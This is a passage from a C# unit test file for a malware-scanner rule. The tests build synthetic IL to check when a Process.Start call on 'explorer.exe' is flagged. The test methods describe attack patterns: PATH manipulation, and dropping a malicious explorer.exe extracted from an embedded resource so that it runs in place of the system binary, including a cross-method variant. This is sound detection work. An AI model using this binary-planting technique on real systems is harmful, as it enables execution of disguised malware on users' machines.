        var signals = new MethodSignals { HasEnvironmentVariableModification = true };

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, signals);

        // Assert - Should NOT suppress because PATH was manipulated
        result.Should().BeFalse("Process.Start should NOT be suppressed when environment variables were modified (PATH manipulation attack)");
    }

    [Fact]
    public void ShouldSuppressFinding_NoEnvironmentModification_ReturnsTrue()
    {
        // Arrange: Normal explorer.exe call without PATH manipulation
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Ldstr, "C:\\SomePath");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // No environment modification
        var signals = new MethodSignals { HasEnvironmentVariableModification = false };

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, signals);

        // Assert - Should suppress because no PATH manipulation
        result.Should().BeTrue("Process.Start should be suppressed when no environment modification detected");
    }

    #endregion

    #region Security Tests - Embedded Resource Extraction Attack

    /// <summary>
    /// SECURITY TEST: Embedded resource extraction attack vector
    /// If attacker embeds malicious explorer.exe as resource, extracts it via File.WriteAllBytes,
    /// then calls Process.Start("explorer.exe"), we should NOT suppress.
    /// Windows resolves bare filenames from current directory before PATH.
    /// </summary>

    [Fact]
    public void ShouldSuppressFinding_WithFileWrite_ReturnsFalse()
    {
        // Arrange: File write (extracting embedded resource) then Process.Start
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        // Simulate: File.WriteAllBytes("explorer.exe", maliciousBytes)
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Ldloc_0); // byte array from embedded resource
        processor.Emit(OpCodes.Call, new MethodReference("WriteAllBytes", new TypeReference("", "Void", null, null), new TypeReference("System.IO", "File", null, null)));

        // Now call explorer.exe (which would be the just-dropped malicious version)
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Create MethodSignals with file write flag set
        var signals = new MethodSignals { HasFileWrite = true };

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, signals);

        // Assert - Should NOT suppress because file was written (could be embedded resource extraction)
        result.Should().BeFalse("Process.Start should NOT be suppressed when files were written (embedded resource attack)");
    }

    [Fact]
    public void ShouldSuppressFinding_NoFileWrite_ReturnsTrue()
    {
        // Arrange: Normal explorer.exe call without file writes
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Ldstr, "C:\\SomePath");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // No file writes
        var signals = new MethodSignals { HasFileWrite = false };

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, signals);

        // Assert - Should suppress because no file writes detected
        result.Should().BeTrue("Process.Start should be suppressed when no file writes detected");
    }

    [Fact]
    public void ShouldSuppressFinding_CrossMethodFileWrite_ReturnsFalse()
    {
        // SECURITY TEST: Cross-method attack
        // Attacker writes file in MethodA, executes in MethodB
        // We should detect this via type-level signals
        var method = new MethodDefinition("Execute", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // This method has no file writes, but type-level signals show file writes in other methods
        var methodSignals = new MethodSignals { HasFileWrite = false };
        var typeSignals = new MethodSignals { HasFileWrite = true }; // File written in different method

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, methodSignals, typeSignals);

        // Assert - Should NOT suppress because type has file writes (cross-method attack)
        result.Should().BeFalse("Process.Start should NOT be suppressed when type has file writes in other methods");
    }

    #endregion
}
